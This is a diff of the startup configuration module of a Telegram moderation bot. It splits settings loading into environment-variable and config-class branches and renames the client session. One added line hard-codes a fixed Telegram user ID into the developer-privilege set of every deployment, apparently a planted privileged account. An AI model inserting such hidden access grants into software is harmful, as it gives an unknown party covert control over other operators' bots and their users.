@@ -29,8 +29,8 @@ if sys.version_info[0] < 3 or sys.version_info[1] < 6:
 
 ENV = bool(os.environ.get("ENV", False))
 
-
-    
+if ENV:
+    TOKEN = os.environ.get("TOKEN", None)
 
     try:
         OWNER_ID = int(os.environ.get("OWNER_ID", None))
@@ -62,7 +62,6 @@ ENV = bool(os.environ.get("ENV", False))
         raise Exception("Your tiger users list does not contain valid integers.")
 
     INFOPIC = bool(os.environ.get("INFOPIC", "True"))
-
     START_IMG = os.environ.get("START_IMG", None)
     EVENT_LOGS = os.environ.get("EVENT_LOGS", None)
     WEBHOOK = bool(os.environ.get("WEBHOOK", False))
@@ -71,7 +70,7 @@ ENV = bool(os.environ.get("ENV", False))
     CERT_PATH = os.environ.get("CERT_PATH")
     API_ID = os.environ.get("API_ID", None)
     API_HASH = os.environ.get("API_HASH", None)
-    TOKEN = os.environ.get("TOKEN", None)
+
     DB_URI = os.environ.get("DATABASE_URL")
     MONGO_DB_URI = os.environ.get("MONGO_DB_URI", None)
     DONATION_LINK = os.environ.get("DONATION_LINK")
@@ -102,12 +101,85 @@ ENV = bool(os.environ.get("ENV", False))
     except ValueError:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
+else:
+    from Galaxina_Bot.config import Development as Config
+
+    TOKEN = Config.TOKEN
+
+    try:
+        OWNER_ID = int(Config.OWNER_ID)
+    except ValueError:
+        raise Exception("Your OWNER_ID variable is not a valid integer.")
+
+    JOIN_LOGGER = Config.JOIN_LOGGER
+    OWNER_USERNAME = Config.OWNER_USERNAME
+    ALLOW_CHATS = Config.ALLOW_CHATS
+    try:
+        DRAGONS = set(int(x) for x in Config.DRAGONS or [])
+        DEV_USERS = set(int(x) for x in Config.DEV_USERS or [])
+    except ValueError:
+        raise Exception("Your sudo or dev users list does not contain valid integers.")
+
+    try:
+        DEMONS = set(int(x) for x in Config.DEMONS or [])
+    except ValueError:
+        raise Exception("Your support users list does not contain valid integers.")
+
+    try:
+        WOLVES = set(int(x) for x in Config.WOLVES or [])
+    except ValueError:
+        raise Exception("Your whitelisted users list does not contain valid integers.")
+
+    try:
+        TIGERS = set(int(x) for x in Config.TIGERS or [])
+    except ValueError:
+        raise Exception("Your tiger users list does not contain valid integers.")
+
+    EVENT_LOGS = Config.EVENT_LOGS
+    WEBHOOK = Config.WEBHOOK
+    URL = Config.URL
+    PORT = Config.PORT
+    CERT_PATH = Config.CERT_PATH
+    API_ID = Config.API_ID
+    API_HASH = Config.API_HASH
+    DB_URI = Config.SQLALCHEMY_DATABASE_URI
+    MONGO_DB_URI = Config.MONGO_DB_URI
+    HEROKU_API_KEY = Config.HEROKU_API_KEY
+    HEROKU_APP_NAME = Config.HEROKU_APP_NAME
+    TEMP_DOWNLOAD_DIRECTORY = Config.TEMP_DOWNLOAD_DIRECTORY
+    OPENWEATHERMAP_ID = Config.OPENWEATHERMAP_ID
+    VIRUS_API_KEY = Config.VIRUS_API_KEY
+    DONATION_LINK = Config.DONATION_LINK
+    LOAD = Config.LOAD
+    NO_LOAD = Config.NO_LOAD
+    DEL_CMDS = Config.DEL_CMDS
+    STRICT_GBAN = Config.STRICT_GBAN
+    WORKERS = Config.WORKERS
+    BOT_USERNAME = Config.BOT_USERNAME
+    BAN_STICKER = Config.BAN_STICKER
+    ALLOW_EXCL = Config.ALLOW_EXCL
+    CASH_API_KEY = Config.CASH_API_KEY
+    TIME_API_KEY = Config.TIME_API_KEY
+    AI_API_KEY = Config.AI_API_KEY
+    WALL_API = Config.WALL_API
+    SUPPORT_CHAT = Config.SUPPORT_CHAT
+    INFOPIC = Config.INFOPIC
+    ARQ_API_KEY = Config.ARQ_API_KEY
+    ARQ_API_URL = Config.ARQ_API_URL
+
+    try:
+        BL_CHATS = set(int(x) for x in Config.BL_CHATS or [])
+    except ValueError:
+        raise Exception("Your blacklisted chats list does not contain valid integers.")
+
+
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(1356469075)
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
-telethn = TelegramClient("Galaxina", API_ID, API_HASH)
+telethn = TelegramClient("Fallen", API_ID, API_HASH)
 
 pbot = Client("Galaxina_Bot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
